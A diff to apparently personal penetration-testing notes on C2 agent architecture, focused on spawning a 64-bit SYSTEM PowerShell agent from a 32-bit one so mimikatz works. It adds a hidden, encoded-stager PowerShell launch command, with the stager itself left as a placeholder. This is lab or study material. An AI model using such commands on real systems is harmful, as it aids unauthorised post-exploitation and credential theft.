@@ -7,7 +7,7 @@
 Always check for the following:
 1. Integrity - High
 2. Running as - System
-3. Arch / Bit - 32 Bit or 64 Bit PowerShell Process
+3. Arch / Bit - 32 Bit will show as x86 Architecture or 64 Bit PowerShell Process
 
 This is due to the fact that the binary we compiled with PowerUp is only 32-bit and there is not a 64-bit option.
 - If we run mimikatz with this agent, it will fail due to the architecture mismatch. In fact, many of the modules will not function properly with this 32-bit agent. 
@@ -19,7 +19,9 @@ On 64-bit Windows, the System32 folder holds the 64-bit binaries and the SysWOW6
 
 `64-bit (x64) PowerShell is located at %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
 
-Note: We cannot spawn a 64 bit PS from a 32 bit agent. To spawn a new process / agent, we can 
+Note: We cannot spawn a 64 bit PS from a 32 bit agent. To spawn a new process / agent:
+`C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc  <ENCODED_PART_OF_STAGER>`
+- Observe, we now have a new agent that is a 64-bit process running as SYSTEM!
 
 ![[Pasted image 20240331023805.png]]
 ## Enumeration 
